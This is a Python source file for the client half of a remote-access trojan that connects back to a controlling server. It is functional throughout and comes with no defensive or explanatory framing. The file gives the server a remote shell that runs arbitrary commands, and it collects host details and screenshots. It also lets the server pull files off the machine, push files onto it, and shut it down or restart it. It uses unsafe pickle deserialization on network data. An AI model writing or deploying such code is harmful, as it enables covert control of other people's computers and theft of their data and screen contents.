import os
import pickle
import platform
import shlex
import socket
import subprocess
from uuid import getnode as get_mac
from PIL import ImageGrab as ig

HOST = '127.0.0.1'
PORT = 8820
default_dir = os.getcwd()


def recv_file(conn):
    """Receive a file from the server"""
    sFileName = conn.recv(1024)
    if sFileName == 'abort':
        return
    conn.send("ok")
    sData = conn.recv(1024)
    fDownloadFile = open(sFileName, "wb")
    conn.settimeout(5)
    while sData:
        fDownloadFile.write(sData)
        try:
            sData = conn.recv(1024)
        except:
            break
    fDownloadFile.close()
    conn.settimeout(None)


def send_file(conn):
    """Send a file to the server"""
    while True:
        elements = {}
        dir = s.recv(1024).decode('utf-8')  # Receive the directory and decode it if Hebrew
        if dir == 'copy':
            sFileName = pickle.loads(conn.recv(1024))
            conn.send(str(sFileName.rsplit("/", 1)[-1]))  # slicing and keeping only the file name and extension
            ok = conn.recv(1024)
            fUploadFile = open(sFileName, "rb")
            sRead = fUploadFile.read(1024)
            while sRead:
                conn.send(sRead)
                sRead = fUploadFile.read(1024)
            print "Send completed"
            fUploadFile.close()
        elif dir == 'exit':
            break
        else:
            try:
                for p in os.listdir(dir):  # Loops all the items in dir
                    ptype = None
                    p = os.path.join(dir, p).replace('\\', '/')  # Full path
                    if os.path.isdir(p):
                        ptype = "directory"
                    elif os.path.isfile(p):
                        ptype = "file"
                    elements[p] = ptype  # Append the full path and its type to the dictionary
            except WindowsError:  # If access to the folder is denied due to low privileges
                print "Access is denied"
            elements = sorted(elements.iteritems())  # Sort dictionary by keys alphabetically. Returns a list
            s.send(pickle.dumps(elements))  # Send the list of tuples


# Initialize the connection to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))


# Main
while True:
    command = s.recv(1024)  # Get the button that was clicked
    if command == 'info':
        mac = format(get_mac(), 'x')
        mac = ':'.join(mac[i:i + 2] for i in range(0, 12, 2))
        mac = mac.upper()
        ip = socket.gethostbyname(socket.gethostname())
        ip = str(ip)
        mac = str(mac)
        ops = str(platform.platform())
        hname = str(platform.node())
        output = [ip, mac, ops, hname]
        s.send(pickle.dumps(output))
    elif command == 'shutdown':
        os.system("shutdown -s")
    elif command == 'restart':
        os.system("shutdown -r")
    elif command == 'shell':
        while True:
            s.send(os.getcwd())  # Send current working directory
            inp = s.recv(1024)  # Get command to execute
            if inp and inp != 'exit':
                args = shlex.split(inp)
                if args[0] == 'cd' and len(args) == 2:  # If command is change directory
                    newdir = args[1]
                    try:
                        os.chdir(newdir)
                    except Exception as e:
                        msg = ("Failed {}".format(str(e)))
                        s.send(msg)
                    else:
                        msg = ("Changed directory to '{}'".format(newdir))
                        s.send(msg)
                else:
                    p = subprocess.Popen(args, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE)
                    outdata, errdata = p.communicate()
                    rc = p.wait()
                    if rc:
                        msg = ("Command failed {}".format(errdata))
                        s.send(msg)
                    else:
                        msg = outdata.strip().decode("862").encode('utf-8')
                        if msg == '':
                            s.send("Done")
                        else:
                            s.send(msg)
            elif inp == 'exit':
                break
    elif command == 'screenshot':
        pic = ig.grab()
        s.send(pickle.dumps(pic))
    elif command == 'upload':
        recv_file(s)
    elif command == 'download':
        send_file(s)
    else:
        pass
s.close()
